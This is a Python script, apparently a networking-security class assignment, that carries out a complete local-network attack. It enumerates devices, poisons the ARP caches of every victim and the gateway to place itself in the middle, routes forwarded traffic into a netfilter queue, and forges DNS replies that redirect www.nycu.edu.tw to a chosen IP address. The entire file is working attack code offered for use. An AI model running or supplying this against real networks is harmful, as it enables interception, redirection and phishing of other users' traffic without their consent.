#!/usr/bin/python3
import subprocess
import netifaces
import scapy.all as scapy
import os
from netfilterqueue import NetfilterQueue

def dns_spoof(packet):
    spoof = scapy.IP(packet.get_payload())
    if spoof.haslayer(scapy.DNSRR):
        if b'www.nycu.edu.tw' in spoof[scapy.DNSQR].qname:
            respond = scapy.DNSRR(rrname=spoof[scapy.DNSQR].qname,rdata='140.113.207.237')
            spoof[scapy.DNS].an = respond
            spoof[scapy.DNS].ancount = 1

            del spoof[scapy.IP].len
            del spoof[scapy.IP].chksum
            del spoof[scapy.UDP].chksum
            del spoof[scapy.UDP].len

            #packet.set_payload(str(spoof))
            #packet.set_payload(bytes(spoof))
            #packet.payload = spoof.payload
            packet.drop()
            scapy.send(spoof,verbose=False)
    else:
        packet.accept()

def main():

    # Task I
    ipmac = subprocess.check_output('./get_ipmac.sh').decode('utf-8').split()
    ipmac_list = []
    print('Available devices')
    print('-------------------------------------')
    print('IP                  MAC')
    print('-------------------------------------')
    gateway_mac = 0
    for i in range(len(ipmac)//2):
        if ipmac[i*2].find('gateway') != -1:
            gateway_mac = ipmac[i*2+1]
            continue
        ipmac_list.append((ipmac[i*2],ipmac[i*2+1]))
        print(f'{ipmac[i*2]:<20}{ipmac[i*2+1]}')

    # Task II
    gateway_ip = netifaces.gateways()[2][0][0]
    # print(gateway_ip,gateway_mac)
    for ip,mac in ipmac_list:
        # op = 2 -> ARP response
        victim_spoof = scapy.ARP(op=2,pdst=ip,hwdst=mac,psrc=gateway_ip)
        router_spoof = scapy.ARP(op=2,pdst=gateway_ip,hwdst=gateway_mac,psrc=ip)
        scapy.send(victim_spoof,verbose=False)
        scapy.send(router_spoof,verbose=False)

    # Task IV
    QUEUE_NUM = 0
    os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}')
    queue = NetfilterQueue()
    try:
        queue.bind(QUEUE_NUM,dns_spoof)
        queue.run()
    except KeyboardInterrupt:
        print('\nInterrupted by keyboard')

if __name__ == '__main__':
    main()
